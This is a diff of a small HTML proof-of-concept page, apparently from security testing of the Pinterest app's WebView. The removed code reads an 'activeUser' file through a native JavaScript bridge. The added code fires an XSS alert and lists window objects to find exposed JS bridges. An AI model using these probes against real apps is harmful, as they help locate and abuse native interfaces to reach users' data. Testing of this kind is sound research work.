@@ -1,21 +1,21 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <title>Test Access ActiveUser File via JS Bridge</title>
-</head>
-<body>
-  <h1>Test ActiveUser File Access</h1>
-  <button onclick="readActiveUser()">Read activeUser File</button>
+  <body>
+    <script>
+      alert("XSS in Pinterest WebView");
 
-  <script>
-    function readActiveUser() {
-      try {
-        window.nativeApp.loadFile("activeUser")
+      let foundKeys = "";
 
-      } catch(e) {
-        alert("Error: " + e.message);
+      for (let key in window) {
+        try {
+          if (typeof window[key] === "object" || typeof window[key] === "function") {
+            foundKeys += key + "\n";
+          }
+        } catch (e) {
+          // تجاهل الأخطاء
+        }
       }
-    }
-  </script>
-</body>
+
+      alert("JS Bridges / Window Keys:\n\n" + foundKeys);
+    </script>
+  </body>
 </html>
